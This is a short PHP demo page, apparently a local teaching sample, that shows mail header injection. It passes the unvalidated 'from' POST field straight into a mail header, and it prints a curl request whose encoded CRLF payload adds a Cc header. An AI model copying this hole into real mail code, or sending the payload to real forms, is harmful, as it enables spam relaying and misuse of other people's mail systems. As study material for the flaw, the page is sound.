<?php
// ホントはバリデーションしたりエラー処理したりするべきだけどサンプルなので
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $from    = empty($_POST['from']) ? 'example@example.com' : $_POST['from'];
    $to      = empty($_POST['to']) ? 'example@example.com' : $_POST['to'];
    $subject = empty($_POST['subject']) ? 'タイトル' : $_POST['subject'];
    $message = empty($_POST['message']) ? 'テスト本文' : $_POST['message'];
    $headers = 'From: ' . $from . "\r\n";
    mb_send_mail($to, $subject, $message, $headers);

    $url = "http://${_SERVER['HTTP_HOST']}/mail.php";
    header('Location: ' . $url);
    exit;
}
?>
<!DOCTYPE html>
<html lang="ja">

<head>
    <meta charset="UFT-8">
    <title>mail header injection</title>
</head>

<body>
    <h1>メールヘッダーインジェクションのサンプル</h1>
    <form method="post">
        <label for="from">From:</label>
        <input type="text" id="from" name="from" value="example-from@example.com"><br />
        <label for="to">To:</label>
        <input type="text" id="to" name="to" value="example-to@example.com"><br />
        <label for="subject">タイトル:</label>
        <input type="text" id="subject" name="subject" value="タイトル"><br />
        <label for="message">本文:</label>
        <input type="text" id="message" name="message" value="テスト本文"><br />
        <input type="submit" value="送信">
    </form>
    <hr>
    <a href="http://localhost:1080">mail確認</a>
    <a href="https://qiita.com/togana/items/16199cdee24e65802c7b">参考</a>
    <hr>
    curl -i -s -k -X $'POST' --data-binary $'from=example-from%40example.com%0d%0aCc:%20example-cc%40example.com&to=example-to%40example.com&subject=%E3%82%BF%E3%82%A4%E3%83%88%E3%83%AB&message=%E3%83%86%E3%82%B9%E3%83%88%E6%9C%AC%E6%96%87' $'http://localhost:5000/mail.php'
</body>

</html>